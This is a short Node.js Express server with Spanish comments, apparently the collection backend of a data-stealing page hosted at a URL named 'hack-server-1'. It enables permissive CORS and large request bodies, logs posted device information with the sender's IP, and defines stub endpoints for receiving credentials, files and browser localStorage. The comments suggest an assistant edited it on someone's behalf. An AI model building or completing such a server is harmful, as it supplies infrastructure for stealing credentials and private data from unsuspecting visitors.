const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');
const fs = require('fs-extra');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// Middlewares
app.use(cors());
app.use(bodyParser.json({ limit: '50mb' }));
app.use(bodyParser.urlencoded({ extended: true, limit: '50mb' }));

// Crear carpetas
fs.ensureDirSync('./logs');
fs.ensureDirSync('./uploads');

// Servir archivos estáticos desde public
const publicPath = path.join(__dirname, 'public');

app.use(express.static(publicPath));

// Ruta principal
app.get('/', (req, res) => {
    res.sendFile(path.join(publicPath, 'index.html'));
});

// Tus rutas API (mantengo las tuyas)
app.post('/api/device-info', async (req, res) => {
    try {
        const data = req.body;
        const logEntry = { timestamp: new Date().toISOString(), ip: req.ip, data };
        await fs.appendFile('./logs/device_info.log', JSON.stringify(logEntry) + '\n');
        res.json({ status: 'success' });
    } catch (e) {
        res.status(500).json({ status: 'error' });
    }
});

app.post('/api/credentials', async (req, res) => { /* tu código */ });
app.post('/api/files', async (req, res) => { /* tu código */ });
app.post('/api/localstorage', async (req, res) => { /* tu código */ });

// Iniciar servidor
app.listen(PORT, () => {
    console.log(`🚀 Servidor corriendo en puerto ${PORT}`);
    console.log(`📍 URL: https://hack-server-1.onrender.com`);
    console.log(`📁 Public path: ${publicPath}`);
});